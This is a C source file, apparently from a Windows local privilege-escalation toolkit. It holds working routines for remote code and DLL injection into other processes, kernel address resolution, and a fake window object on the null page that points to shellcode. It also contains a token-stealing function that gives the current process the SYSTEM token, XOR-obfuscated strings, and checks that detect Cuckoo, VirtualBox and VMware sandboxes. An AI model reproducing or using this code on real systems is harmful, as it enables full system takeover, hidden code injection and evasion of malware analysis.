#include "WinApiWrapper.h"
#include "EopUtils.h"
#include "crt.h"
#include <TlHelp32.h>
#include "KernelMode.h"
#include "EggTag.h"
#include <conio.h>

#pragma section("wineop", read, execute)
#pragma code_seg("wineop")

// usage
// 	DWORD dwAllocateSize = 0x20 * 6 + 0x12;
// 	PoolAllocAndCopyViaAccelTable(lpEnv, dwAllocateSize, NULL);

HANDLE WINAPI PoolAllocAndCopyViaAccelTable(
	__in LPENVIRONMENT env, 
	__in DWORD nNumberOfBytes, 
	__inout_bcount(nNumberOfBytes - 0x12) LPVOID lpBuffer/* = NULL*/ 
	)
{
	DWORD d  = 0;
	HANDLE ret;
	char * tempBuf = NULL;

	if (nNumberOfBytes <= 0x12)
		return NULL;

	d = (nNumberOfBytes - 0x12);
	if ((d % 6 != 0))
	{
		return NULL;
	}

	if (lpBuffer == NULL)
	{
		tempBuf = (char *)__MALLOC__(nNumberOfBytes - 0x12);
		if (tempBuf == NULL) return NULL;
		__MEMSET__(tempBuf, 0, nNumberOfBytes - 0x12);
	}

	ret = CWA(env, CreateAcceleratorTableW)((LPACCEL )(lpBuffer ? lpBuffer : tempBuf), (d/6));
	if (tempBuf)
	{
		__FREE__(tempBuf);
	}
	return ret;
}

DWORD WINAPI InjectCodeToAnotherProcess(
	__in LPENVIRONMENT env, __in DWORD pid, 
	__in LPVOID lpCode, __in SIZE_T dwCodeSize, 
	__in_opt DWORD dwMilliseconds /*= 0*/, 
	__in_opt LPVOID lpParameter /*= NULL*/, 
	__in_opt SIZE_T dwStackSize /*= 0*/
	)
{
	DWORD dwLastError = 0;
	HANDLE hProcess = CWA(env, OpenProcess)(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hProcess == NULL)
		return CWA(env, GetLastError)();

	LPVOID lpRemoteMem = CWA(env, VirtualAllocEx)(hProcess, NULL, dwCodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (lpRemoteMem)
	{
		SIZE_T dwWritten;
		if (CWA(env, WriteProcessMemory)(hProcess, lpRemoteMem, lpCode, dwCodeSize, &dwWritten) && (dwWritten == dwCodeSize))
		{
			HANDLE hRemoteThread = CWA(env, CreateRemoteThread)(hProcess, NULL, 
				dwStackSize, (LPTHREAD_START_ROUTINE)lpRemoteMem, lpParameter, 0, NULL );
			if (hRemoteThread)
			{
				if (dwMilliseconds == 0)
				{
					CWA(env, CloseHandle)(hRemoteThread);
					dwLastError = ERROR_SUCCESS;
				}
				else
				{
					BOOL bRemovableMem = FALSE;
					DWORD dwWait = 0;
					dwWait = CWA(env, WaitForSingleObject)(hRemoteThread, dwMilliseconds);
					if (dwWait == WAIT_TIMEOUT)
					{
						CWA(env, TerminateThread)(hRemoteThread, 0);
						bRemovableMem = TRUE;
					}
					else if (dwWait == WAIT_OBJECT_0)
					{
						bRemovableMem = TRUE;
					}
					else
					{
						dwLastError = CWA(env, GetLastError)();
					}

					CWA(env, CloseHandle)(hRemoteThread);
					if (bRemovableMem)
					{
						CWA(env, VirtualFreeEx)(hProcess, lpCode, 0, MEM_FREE);
						dwLastError = ERROR_SUCCESS;
					}
				}
			}
			else
			{
				dwLastError = CWA(env, GetLastError)();
			}
		}
		else
		{
			dwLastError = CWA(env, GetLastError)();
		}
	}
	else
	{
		dwLastError = CWA(env, GetLastError)();
	}
	CWA(env, CloseHandle)(hProcess);
	return dwLastError;
}

DWORD WINAPI LoadRemoteLibrary(
	__in LPENVIRONMENT env, 
	__in DWORD pid, 
	__in LPCSTR lpLibFileName, 
	__in_opt DWORD dwMilliseconds /*= 0*/
	)
{
	DWORD dwLastError = 0;
	HANDLE hProcess = CWA(env, OpenProcess)(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hProcess == NULL)
		return CWA(env, GetLastError)();

	SIZE_T dwLen = 0;
	dwLen = (SIZE_T)__STRLEN__(lpLibFileName);
	LPVOID lpRemoteLibFileName = CWA(env, VirtualAllocEx)(hProcess, NULL, dwLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (lpRemoteLibFileName)
	{
		if (CWA(env, WriteProcessMemory)(hProcess, lpRemoteLibFileName, (LPVOID)lpLibFileName, dwLen, NULL))
		{
			HANDLE hRemoteThread = CWA(env, CreateRemoteThread)(hProcess, NULL, 
				0, (LPTHREAD_START_ROUTINE)CWA(env, LoadLibraryA), lpRemoteLibFileName, 0, NULL );
			if (hRemoteThread)
			{
				if (dwMilliseconds == 0)
				{
					CWA(env, CloseHandle)(hRemoteThread);
					dwLastError = ERROR_SUCCESS;
				}
				else
				{
					BOOL bRemovableMem = FALSE;
					DWORD dwWait = 0;
					dwWait = CWA(env, WaitForSingleObject)(hRemoteThread, dwMilliseconds);
					if (dwWait == WAIT_OBJECT_0)
					{
						bRemovableMem = TRUE;
					}
					else
					{
						dwLastError = CWA(env, GetLastError)();
					}

					CWA(env, CloseHandle)(hRemoteThread);
					if (bRemovableMem)
					{
						CWA(env, VirtualFreeEx)(hProcess, lpRemoteLibFileName, 0, MEM_FREE);
						dwLastError = ERROR_SUCCESS;
					}
				}
			}
			else
			{
				dwLastError = CWA(env, GetLastError)();
			}
		}
		else
		{
			dwLastError = CWA(env, GetLastError)();
		}
	}
	else
	{
		dwLastError = CWA(env, GetLastError)();
	}
	CWA(env, CloseHandle)(hProcess);
	return dwLastError;
}

BOOL WINAPI SetPrivilege(
	__in LPENVIRONMENT env,
	__in HANDLE hProcess, // process handle 
	__in LPCSTR lpszPrivilege, // name of privilege to enable/disable
	__in BOOL bEnable // enable or disable
	)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;
	HANDLE hToken;
	if (FALSE == CWA(env, OpenProcessToken)(hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
		return FALSE;

	if (CWA(env, LookupPrivilegeValueA)(NULL, lpszPrivilege, &luid) == FALSE)
	{
		CWA(env, CloseHandle)(hToken);
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;
	if (FALSE == CWA(env, AdjustTokenPrivileges)(hToken, FALSE, &tp, sizeof(tp), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
	{
		CWA(env, CloseHandle)(hToken);
		return FALSE;
	}

	DWORD dwErr = CWA(env, GetLastError)();
	CWA(env, CloseHandle)(hToken);

	return (dwErr != ERROR_NOT_ALL_ASSIGNED);
}

DWORD GetParentPid( 
   __in LPENVIRONMENT env, 
   __in DWORD pid 
   )
{
	HANDLE hSnapshot;
	DWORD ppid = 0;
	PROCESSENTRY32W pe32;
	UNREFERENCED_PARAMETER(env);

	__MEMSET__(&pe32, 0, sizeof(pe32));

	hSnapshot = CWA(env, CreateToolhelp32Snapshot)(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE)
		return 0;

	pe32.dwSize = sizeof(pe32);
	if (CWA(env, Process32FirstW)(hSnapshot, &pe32))
	{
		do
		{
			if (pe32.th32ProcessID == pid )
			{
				ppid = pe32.th32ParentProcessID;
				break;
			}
		} while (CWA(env, Process32NextW)(hSnapshot, &pe32));
	}
	CWA(env, CloseHandle)(hSnapshot);

	return ppid;
}

void SpawnNewProcess(
	__in LPENVIRONMENT env,
	__inout LPSTR lpCommandLine,
	__in WORD wShowWindow /*= SW_HIDE */ 
	)
{
	if (wShowWindow == NO_PROCESS) return;

	if (env->dwCurrentPid != CWA(env, GetCurrentProcessId)())
		return;

	if (lpCommandLine == NULL)
	{
		char cmdbuf[MAX_PATH * 2];
		DWORD cch;

		__MEMSET__(cmdbuf, 0, sizeof(cmdbuf));
		cch = CWA(env, ExpandEnvironmentStringsA)(env->lpString->strcomspec, cmdbuf, MAX_PATH);
		if ((cch != 0) && (cch < MAX_PATH)) {
			SpawnNewProcess(env, cmdbuf, SW_SHOW);
		}
		return;
	}

	STARTUPINFOA startupInfo;
	PROCESS_INFORMATION processInfo;
	__MEMSET__(&startupInfo, 0, sizeof(startupInfo));
	__MEMSET__(&processInfo, 0, sizeof(processInfo));

	startupInfo.cb = sizeof(startupInfo);
	startupInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USECOUNTCHARS;
	startupInfo.wShowWindow = wShowWindow;
	startupInfo.dwXCountChars = 80;
	startupInfo.dwYCountChars = 300;

	if (CWA(env, CreateProcessA)(NULL, lpCommandLine, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE, NULL,
		NULL, &startupInfo, &processInfo))
	{
		CWA(env, CloseHandle)(processInfo.hProcess);
		CWA(env, CloseHandle)(processInfo.hThread);
	}
}

int GetEnvironment( __inout LPENVIRONMENT env )
{
	__MEMSET__(&env->osver, 0, sizeof(env->osver));
	if (!GetApiFunctions(env)) 
		return ENV_FAILURE;

	FixPointer(env, GET_FUNCTION_ADDRESS(env, StealSystemProcessToken), ENVIRONMENT_TAG );

	env->osver.dwOSVersionInfoSize = sizeof(env->osver);
	if (FALSE == CWA(env, GetVersionExA)((LPOSVERSIONINFOA)&env->osver))
		return ENV_FAILURE;

	if (CWA(env, IsWow64Process)(CWA(env, GetCurrentProcess)(), &env->bIsWow64Process) == FALSE)
	{
		env->bIsWow64Process = FALSE;
	}

	DWORD dwCurrPid = CWA(env, GetCurrentProcessId)();
	if (env->dwCurrentPid == CURRENT_PID)
	{
		env->dwCurrentPid = dwCurrPid;
	}
	else if (env->dwCurrentPid == PARENT_PID)
	{
		env->dwCurrentPid = GetParentPid(env, dwCurrPid);
	}

	if (env->dwCurrentPid == 0) return ENV_FAILURE;

	__MEMSET__(&env->offset, 0, sizeof(env->offset));

#ifdef _M_IX86
	if (env->osver.dwMajorVersion == 5)
	{
		switch(env->osver.dwMinorVersion)
		{
		case 0: // WIN2k
			env->offset.dwTokenOffset = 0x12c;
			break;
		case 1:		//XP
			env->offset.dwTokenOffset = 0xc8; // XP SP3
			break;
		case 2:		// WIN2k3
			env->offset.dwTokenOffset = 0xd8;
			break;
		default:
			env->offset.dwTokenOffset = 0;
			break;
		}
	}
	else if (env->osver.dwMajorVersion == 6)
	{
		switch(env->osver.dwMinorVersion)
		{
		case 0:	//VISTA 
			env->offset.dwTokenOffset = 0xe0;
			break;
		case 1:		// Win7
			env->offset.dwTokenOffset = 0xF8;
			env->offset.dwKprocessOffset = 0x150;
			env->offset.dwActiveProcessLinksOffset = 0x0b8;
			env->offset.dwUIdOffset = 0x0b4;
			break;
		default:
			env->offset.dwTokenOffset = 0;
			break;
		}
	}
#elif defined _WIN64 || defined _M_X64
	if (env->osver.dwMajorVersion == 5)
	{
		switch(env->osver.dwMinorVersion)
		{
		case 0:	//WIN2K
			env->offset.dwTokenOffset = 0x0;
			break;
		case 1:	//XP 
			env->offset.dwTokenOffset = 0x160;
			break;
		case 2:	//WIN server 2k3
			env->offset.dwTokenOffset = 0x160;
			break;
		default:
			env->offset.dwTokenOffset = 0;
			break;
		}
	}
	else if (env->osver.dwMajorVersion == 6)
	{
		switch(env->osver.dwMinorVersion)
		{
		case 0:	// VISTA
			env->offset.dwTokenOffset = 0x168;
			break;
		case 1:	// WIN7, WinServer2k8 R2
			env->offset.dwTokenOffset = 0x208;
			break;
		case 2:
			{
				char szVer[20];

				__MEMSET__(szVer, '\0', sizeof(szVer));
				if (( GetVersionString(env, _countof(szVer), szVer) > 0 ) && (CWA(env, GetLastError)() == ERROR_SUCCESS))
				{
					char sz6_3[4] = {'6', '.', '3', '\0'};
					if (!__STRCMPI__(szVer, sz6_3))
						env->offset.dwTokenOffset = 0x348;	
				}
			}

			break;
		default:
			env->offset.dwTokenOffset = 0;
			break;
		}
	}
#endif // _WIN64		

	if (!env->offset.dwTokenOffset) return ENV_TOKEN_NOT_FOUND;


#ifdef _M_IX86

	env->offset.dwWndProcOffset    = 0x60;
	env->offset.dwThreadInfoOffset = 0x08;
	env->offset.dwServerSideOffset = 0x14 + 2; //flag  +0x014 bServerSideWindowProc : Pos 18, 1 Bit --> active Kernel Window

#elif defined _WIN64 || defined _M_X64
	env->offset.dwWndProcOffset    = 0x90;
	env->offset.dwThreadInfoOffset = 0x10;
	env->offset.dwServerSideOffset = 0x28 + 2; //flag  +0x014 bServerSideWindowProc : Pos 18, 1 Bit --> active Kernel Window
#endif

	GetCurrentProcessEnvironment(env);

	ULONG    i, nByte;
	PVOID    pBuffer;
	char	 *pntModule;
	PSYSTEM_MODULE_INFORMATION  pSystemModuleInformation;
	HMODULE  hKernel = NULL;
	HMODULE  hKernelBase = NULL;


	if (STATUS_INFO_LENGTH_MISMATCH != CWA(env, ZwQuerySystemInformation)(SystemModuleInformation, (PVOID)&nByte, 0, &nByte))
	{
		return ENV_NATIVE_FAILURE;
	}

	nByte *= 2;

	if((pBuffer = __MALLOC__(nByte)) == NULL)
	{
		return ENV_NATIVE_OUT_OF_MEM;
	}

	if(CWA(env, ZwQuerySystemInformation)(SystemModuleInformation, pBuffer, nByte, &nByte))
	{
		__FREE__(pBuffer);
		return ENV_NATIVE_FAILURE;
	}

	char strNt[3] = {'n', 't', '\0'};
	char strExe[5] = {'.', 'e', 'x', 'e', '\0'};
	char strSystem32[11] = { '\\', 's', 'y', 's', 't', 'e', 'm', '3', '2', '\\', '\0'};
	char strPsLookupProcessByProcessId[27] = { 'P', 's', 'L', 'o', 'o', 'k', 'u', 'p', 
		'P', 'r', 'o', 'c', 'e', 's', 's', 'B', 'y', 
		'P', 'r', 'o', 'c', 'e', 's', 's', 'I', 'd', '\0'};

	pSystemModuleInformation = (PSYSTEM_MODULE_INFORMATION)(pBuffer);
	for(i = 0; i < pSystemModuleInformation->Count; i++)
	{
		if((__STRSTRI__(pSystemModuleInformation->Module[i].ImageName, strNt) != NULL) &&
			(__STRSTRI__(pSystemModuleInformation->Module[i].ImageName, strExe) != NULL))
		{
			pntModule = __STRSTRI__(pSystemModuleInformation->Module[i].ImageName, strSystem32);
			if (pntModule)
			{
				pntModule = pntModule + __STRLEN__(strSystem32);

				hKernel = CWA(env, LoadLibraryExA)(pntModule, NULL, DONT_RESOLVE_DLL_REFERENCES);
				if (hKernel == NULL) break;
				hKernelBase = (HMODULE)pSystemModuleInformation->Module[i].Base;
				env->lpWinapiTable->PsLookupProcessByProcessId = 
					(PSLOOKUPPROCESSBYPROCESSID)(
					(ULONG_PTR)CWA(env, GetProcAddress)(hKernel, \
					(char*)strPsLookupProcessByProcessId ) - \
					(ULONG_PTR)hKernel +	\
					(ULONG_PTR) hKernelBase);

				char strHalDispatchTable[17] = { 'H', 'a', 'l', 'D', 'i', 's', 'p', 'a', 't', 'c', 'h', 'T', 'a', 'b', 'l', 'e', '\0'};
				env->kHalDsipatchTable =  (PVOID)((ULONG_PTR)CWA(env, GetProcAddress)(hKernel, \
					(char*)strHalDispatchTable) - \
					(ULONG_PTR)hKernel + \
					(ULONG_PTR)hKernelBase );

				CWA(env, FreeLibrary)(hKernel);
				break;
			}
		}
	}
	__FREE__(pBuffer);
	return ENV_SUCCESS;
}

int NullPagePreparation(
	__inout LPENVIRONMENT env,
	__in LPVOID lpWndProc 
	)
{
	LPVOID  pAllocatedAddr;
	SIZE_T  RegionSize = 0x1000;

	pAllocatedAddr = (LPVOID)(0x1);


	if (NT_SUCCESS(CWA(env, ZwAllocateVirtualMemory)(CWA(env, GetCurrentProcess)(),
		&pAllocatedAddr, 0,
		&RegionSize,
		MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN,
		PAGE_EXECUTE_READWRITE))
		)
	{
		// fake tagWND
		*(DWORD_PTR*)((DWORD_PTR)pAllocatedAddr + env->offset.dwThreadInfoOffset) = (DWORD_PTR)env->pti;  // pointer to tagTHREADINFO
		*(BYTE*)((DWORD_PTR)pAllocatedAddr + env->offset.dwServerSideOffset)      = 0x4;				  // flag  +0x014 bServerSideWindowProc : Pos 18, 1 Bit --> active Kernel Window
		*(DWORD_PTR*)((DWORD_PTR)pAllocatedAddr + env->offset.dwWndProcOffset)    = (DWORD_PTR)lpWndProc; // pointer to shell code
		return ENV_SUCCESS;
	}

	return ENV_FAILURE;
}

PVOID LocateSharedInfo( __in LPENVIRONMENT env )
{
	HMODULE huser32;
	PVOID pSharedInfo = NULL;

	huser32 = CWA(env, GetModuleHandleA)((char*)env->lpString->struser32);
	if (huser32 == NULL)
		huser32 = CWA(env, LoadLibraryA)((char*)env->lpString->struser32);

	if (huser32 == NULL)
		return NULL;
	unsigned char szgSharedInfo[] = { 
		'g' ^ XOR_KEY, 'S' ^ XOR_KEY, 'h' ^ XOR_KEY, 'a' ^ XOR_KEY, 
		'r' ^ XOR_KEY, 'e' ^ XOR_KEY, 'd' ^ XOR_KEY, 'I' ^ XOR_KEY, 
		'n' ^ XOR_KEY, 'f' ^ XOR_KEY, 'o' ^ XOR_KEY, XOR_KEY };
		DecryptString(szgSharedInfo, sizeof(szgSharedInfo), XOR_KEY);
		pSharedInfo = (PVOID)CWA(env, GetProcAddress)(huser32, (char*)szgSharedInfo);
		if (pSharedInfo != NULL)
		{
			// Windows 7 Only
			return pSharedInfo;
		}

		unsigned char szUserRegisterWowHandlers[] = { 
			'U' ^ XOR_KEY, 's' ^ XOR_KEY, 'e' ^ XOR_KEY, 'r' ^ XOR_KEY, 'R' ^ XOR_KEY, 'e' ^ XOR_KEY, 
			'g' ^ XOR_KEY, 'i' ^ XOR_KEY, 's' ^ XOR_KEY, 't' ^ XOR_KEY, 'e' ^ XOR_KEY, 'r' ^ XOR_KEY, 
			'W' ^ XOR_KEY, 'o' ^ XOR_KEY, 'w' ^ XOR_KEY, 'H' ^ XOR_KEY, 'a' ^ XOR_KEY, 'n' ^ XOR_KEY,
			'd' ^ XOR_KEY, 'l' ^ XOR_KEY, 'e' ^ XOR_KEY, 'r' ^ XOR_KEY, 's' ^ XOR_KEY, XOR_KEY };
			DecryptString(szUserRegisterWowHandlers, sizeof(szUserRegisterWowHandlers), XOR_KEY);
			char* pOpCode = (char*)CWA(env, GetProcAddress)(huser32, (char*)szUserRegisterWowHandlers);
			if (pOpCode == NULL)
			{
				return NULL;
			}

			for (ULONG i = 0; i < 0x300; ++i )
			{

#ifdef _M_IX86
				/*
				C7 40 54 B0 C4 D5 77   mov     dword ptr [eax+54h], offset _aiClassWow
				B8 40 94 D7 77         mov     eax, offset _gSharedInfo
				*/
				if ( *(WORD*)(&pOpCode[i])    == 0x40c7 && 
					*(BYTE*)(&pOpCode[i + 7]) == 0xb8
					)
				{
					pSharedInfo = (PVOID) (*(DWORD*)(&pOpCode[i + 8]));
					return pSharedInfo;
				}
#elif defined _WIN64 || defined _M_X64
				/*
				48 89 87 A8 00 00 00   mov     [rdi+0A8h], rax
				48 8D 05 F6 0B 05 00   lea     rax, gSharedInfo // lea rax, [rip + gSharedInfo]
				*/
				if ( *(WORD*)(&pOpCode[i])     == 0x8948 && 
					*(BYTE*)(&pOpCode[i +  2]) == 0x87   &&
					*(WORD*)(&pOpCode[i +  7]) == 0x8d48 &&
					*(BYTE*)(&pOpCode[i +  9]) == 0x05   &&
					*(WORD*)(&pOpCode[i + 14]) != 0x8948 &&
					*(BYTE*)(&pOpCode[i + 16]) != 0x87
					)
				{
					/* lea rax, [rip + relative address ] */
					/*  rax points to rip + relative address + 7*/
					pSharedInfo = (PVOID) (*(DWORD*)(&pOpCode[i + 10]) + (DWORD_PTR)(&pOpCode[i + 7]) + 7);
					return pSharedInfo;
				}
#endif
			}
			return NULL;
}

HWND GetFirstThreadHwnd(
	__in LPENVIRONMENT env,
	__in PVOID pOwner 
	)
{
	PSHAREDINFO		pse;
	PHANDLEENTRY	List;
	ULONG_PTR		c, k;

	pse = (PSHAREDINFO)env->pse;
	if (pse == NULL)
	{
		return NULL;
	}

	if (env->osver.dwMajorVersion >= 6)
	{
		// >= win 7
		if (pse->HeEntrySize != sizeof(HANDLEENTRY))
		{
			return NULL;
		}
	}

	List = pse->aheList;
	k = pse->psi->cHandleEntries;

	if (env->osver.dwMajorVersion == 5 && 
		env->osver.dwMinorVersion == 1)
	{
#ifdef _M_IX86
		k = *(DWORD *)((DWORD)pse->psi + 8);
#elif defined _WIN64 || defined _M_X64
		// Ooo0o0o0o0ps 64 64 64 bit!!!
		// 
#endif
	}

	//
	// Locate, convert and return hwnd for current thread.
	//
	for (c = 0; c < k; c++)
		if ((List[c].pOwner == pOwner) && (List[c].bType == TYPE_WINDOW)) 
		{
			HWND kernelHandleWnd = (HWND)(c | (List[c].wUniq << HMUNIQSHIFT));
			return kernelHandleWnd;
		}

		return NULL;
}

PVOID GetAddressByHandle( 
	__in LPENVIRONMENT env, 
	__in HANDLE Handle 
	)
{
	PHANDLEENTRY	List;
	PSHAREDINFO pse = (PSHAREDINFO)env->pse;
	if (pse == NULL)
		return 0;

	List = pse->aheList;

	if (pse->HeEntrySize != sizeof(HANDLEENTRY))
		return 0;

	for (ULONG_PTR i = 0; i < pse->psi->cHandleEntries; ++i)
	{
		HWND kernelHandleWnd = (HWND)(i | (List[i].wUniq << HMUNIQSHIFT));
		if (kernelHandleWnd == (HWND)Handle)
		{
			return (PVOID) List[i].phead;
		}
	}

	return NULL;
}

PVOID GetWin32kUserModeCallbackTable( __in LPENVIRONMENT env )
{
	DWORD_PTR KernelCallbackTable = 0;
#ifdef _M_IX86
	KernelCallbackTable = *(DWORD_PTR*)((LPBYTE)env->ppeb + 0x02c);
#elif defined _WIN64 || defined _M_X64
	KernelCallbackTable = *(DWORD_PTR*)((LPBYTE)env->ppeb + 0x058);
#endif

	return (PVOID)KernelCallbackTable;
}

DWORD GetVersionString(
	__in LPENVIRONMENT env,
	__in DWORD nSize,
	__out_ecount(nSize) LPSTR lpVerStr 
	)
{
	HKEY hKey;
	LSTATUS status = ERROR_SUCCESS;
	DWORD cbRequired = 0;
	if (ERROR_SUCCESS == CWA(env, RegOpenKeyExA)(HKEY_LOCAL_MACHINE, env->lpString->strSOFTWARE_Microsoft_Windows_NT_CurrentVersion, 0, KEY_READ, &hKey ))
	{
		cbRequired = nSize;
		status = CWA(env, RegQueryValueExA)(hKey, env->lpString->strCurrentVersion, NULL, NULL, (BYTE*) lpVerStr, &cbRequired);
		CWA(env, RegCloseKey)(hKey);
	}
	else
		return 0;

	if (status == ERROR_MORE_DATA)
	{
		CWA(env, SetLastError)(ERROR_MORE_DATA);
		return cbRequired;
	}
	else if (status == ERROR_SUCCESS)
	{
		CWA(env, SetLastError)(ERROR_SUCCESS);
		return cbRequired;
	}

	return 0;
}

VOID RtlInitLargeUnicodeString(
	__out PLARGE_UNICODE_STRING plstr,
	__in LPCWSTR psz,
	__in UINT cchLimit
	)
{
	ULONG Length;
	plstr->Buffer = (PWSTR)psz;
	plstr->bAnsi = FALSE;
	if ( psz!=NULL) {
		Length = __STRLENW__( (LPWSTR)psz ) * sizeof( WCHAR );
		plstr->Length = min(Length, cchLimit);
		plstr->MaximumLength = min((Length + sizeof(UNICODE_NULL)), cchLimit);
	} else {
		plstr->MaximumLength = 0;
		plstr->Length = 0;
	}
}

void GetCurrentProcessEnvironment( __inout LPENVIRONMENT env )
{
	CWA(env, LoadLibraryA)(env->lpString->struser32);

#ifdef _M_IX86
	env->pteb = (PVOID)__readfsdword(0x18);
	env->ppeb = (PVOID)(*(DWORD_PTR*)((char*)env->pteb + 0x030 )); // +0x030 ProcessEnvironmentBlock : Ptr32 _PEB
	env->pti  = (void*)(*(DWORD_PTR*)((PBYTE)env->pteb + 0x40));    // +0x040 Win32ThreadInfo  : Ptr64 Void

#elif defined _WIN64 || defined _M_X64
	env->pteb = (PVOID)__readgsqword(0x30);
	env->ppeb = (PVOID)(*(DWORD_PTR*)((char*)env->pteb + 0x060 )); // +0x060 ProcessEnvironmentBlock : Ptr64 _PEB
	env->pti  = (void*)(*(DWORD_PTR*)((PBYTE)env->pteb + 0x78));    // +0x078 Win32ThreadInfo  : Ptr64 Void
#endif
	env->pse = LocateSharedInfo(env);
}

void ClearHandleTableEntry(
	__in LPBYTE CurrentProcess,
	__in HANDLE handle 
	)
{
#ifdef _M_IX86
	PBYTE ObjectTable             = *(PBYTE *)((ULONG_PTR)CurrentProcess + 0x0f4);
	PBYTE HandleTableEntry        = (PBYTE)(*(ULONG_PTR*)(ObjectTable) + 2*((ULONG_PTR)handle & 0xFFFFFFFC));
	*(PVOID*)HandleTableEntry     = NULL;
	*(ULONG*)(ObjectTable+0x30)  -= 1;

#elif defined _WIN64 || defined _M_X64
	PBYTE ObjectTable             = *(PBYTE *)((ULONG_PTR)CurrentProcess + 0x200)  ;
	ObjectTable                   = (PBYTE)((ULONG_PTR)ObjectTable - ((ULONG_PTR)ObjectTable & 3));
	PBYTE HandleTableEntry        = (PBYTE)(*(ULONG_PTR*)(ObjectTable) + 4*((ULONG_PTR)handle & 0xFFFFFFFC));
	*(PVOID*)HandleTableEntry     = NULL;
	*(ULONG*)(ObjectTable+0x058) -= 1; // handle count
#endif	
}

#pragma optimize("", off)
NTSTATUS NTAPI StealSystemProcessToken( LPVOID * lpCurrEprocess /*= NULL*/ )
{
	NTSTATUS Status = STATUS_FAIL_CHECK;
	LPBYTE CurrentProcess = NULL;
	LPBYTE SystemProcess = NULL;
	LPENVIRONMENT lpEnv = (LPENVIRONMENT) ENVIRONMENT_TAG;

	if (lpEnv->bSystemToken)
		return STATUS_SUCCESS;

	if (!IsKernelMode())
		return STATUS_NO_SUCH_PRIVILEGE;

	if (CWA(lpEnv, PsLookupProcessByProcessId) != NULL)
	{
		Status = CWA(lpEnv, PsLookupProcessByProcessId)((HANDLE)lpEnv->dwCurrentPid, &CurrentProcess);
		if (NT_SUCCESS(Status))
		{
			Status = CWA(lpEnv, PsLookupProcessByProcessId)((HANDLE)0x4, &SystemProcess);
		}
	}
	else
	{
		// PsLookupProcessByProcessId == NULL
		if (lpEnv->pti && 
			lpEnv->offset.dwKprocessOffset && lpEnv->offset.dwActiveProcessLinksOffset && 
			lpEnv->offset.dwTokenOffset && lpEnv->offset.dwUIdOffset)
		{
			LPVOID *pti = (LPVOID *)lpEnv->pti;

			if (pti)
			{
				LPBYTE pEThread = (LPBYTE)*pti;
				CurrentProcess = (LPBYTE)(*(ULONG_PTR*)(pEThread + lpEnv->offset.dwKprocessOffset));
				_LIST_ENTRY *ActiveProcessLinks = (_LIST_ENTRY *) (CurrentProcess + lpEnv->offset.dwActiveProcessLinksOffset);

				do
				{
					ActiveProcessLinks = ActiveProcessLinks->Flink; 
					SystemProcess = (LPBYTE)((ULONG_PTR)ActiveProcessLinks - lpEnv->offset.dwActiveProcessLinksOffset);
					ULONG_PTR SystemProcessId = *(ULONG_PTR*)((ULONG_PTR)SystemProcess + lpEnv->offset.dwUIdOffset);

					if (SystemProcessId == 4) // superman is found
					{
						Status = STATUS_SUCCESS;
						break;
					}

				} while (SystemProcess != CurrentProcess);
			}
		}
	}

	// everything is ok -> replace token now!
	if (NT_SUCCESS(Status) && CurrentProcess && SystemProcess)
	{
		PEX_FAST_REF lpTokenObj = (PEX_FAST_REF)((PBYTE)CurrentProcess + lpEnv->offset.dwTokenOffset);
		(lpTokenObj->u.RefCnt)--;
		*lpTokenObj = *(PEX_FAST_REF)((PBYTE)SystemProcess + lpEnv->offset.dwTokenOffset);
		lpTokenObj->u.RefCnt++;

		lpEnv->bSystemToken = TRUE;
		if (lpCurrEprocess)
			*lpCurrEprocess = (LPVOID)CurrentProcess;

		Status = STATUS_SUCCESS;
	}

	return Status;
}
#pragma optimize("", on)

BOOL IsVm( __in LPENVIRONMENT env )
{
	DISPLAY_DEVICEA DispDev;
	__MEMSET__(&DispDev, 0, sizeof(DispDev));
	DispDev.cb = sizeof(DispDev);
	DWORD iDevEnum = 0;
	char szComputerName[128];
	DWORD nSize = sizeof(szComputerName) / sizeof(*szComputerName);

	unsigned char strcuckoo[7] = { 'c' ^ XOR_KEY, 'u' ^ XOR_KEY, 'c' ^ XOR_KEY, 'k' ^ XOR_KEY, 'o' ^ XOR_KEY, 'o' ^ XOR_KEY, XOR_KEY};
	DecryptString(strcuckoo, sizeof(strcuckoo), XOR_KEY);

	unsigned char strVirtualBox[11] = { 'V' ^ XOR_KEY, 'i' ^ XOR_KEY, 'r' ^ XOR_KEY, 't' ^ XOR_KEY, 'u' ^ XOR_KEY, 'a'
		^ XOR_KEY, 'l' ^ XOR_KEY, 'B' ^ XOR_KEY, 'o' ^ XOR_KEY, 'x' ^ XOR_KEY, XOR_KEY};
	DecryptString(strVirtualBox, sizeof(strVirtualBox), XOR_KEY);

	unsigned char strVMware[7] = { 'V' ^ XOR_KEY, 'M' ^ XOR_KEY, 'w' ^ XOR_KEY, 'a' ^ XOR_KEY, 'r' ^ XOR_KEY, 'e'^ XOR_KEY, XOR_KEY};
	DecryptString(strVMware, sizeof(strVMware), XOR_KEY);

	if (CWA(env, GetComputerNameA)(szComputerName, &nSize))
	{
		if (__STRSTRI__((char*)szComputerName, (char*)strcuckoo))
			return TRUE;
	}

	while (CWA(env, EnumDisplayDevicesA)(NULL, iDevEnum, &DispDev, 0))
	{
		if (__STRSTRI__((char*)DispDev.DeviceName, (char*)strVirtualBox))
			return TRUE;
		if (__STRSTRI__((char*)DispDev.DeviceName, (char*)strVMware))
			return TRUE;

		if (__STRSTRI__((char*)DispDev.DeviceString, (char*)strVirtualBox))
			return TRUE;
		if (__STRSTRI__((char*)DispDev.DeviceString, (char*)strVMware))
			return TRUE;

		iDevEnum++; // next device
	}

	if (iDevEnum == 0)
		return TRUE;

	return FALSE;
}

//////////////////////////////////////////////////////////////////////////
#include <crtdefs.h>
#include <stdio.h>
#include <Strsafe.h>
#pragma comment(lib, "strsafe.lib")
void PrintDebug( _In_z_ _Printf_format_string_ const char * _Format, ... )
{
#ifndef _DEBUG
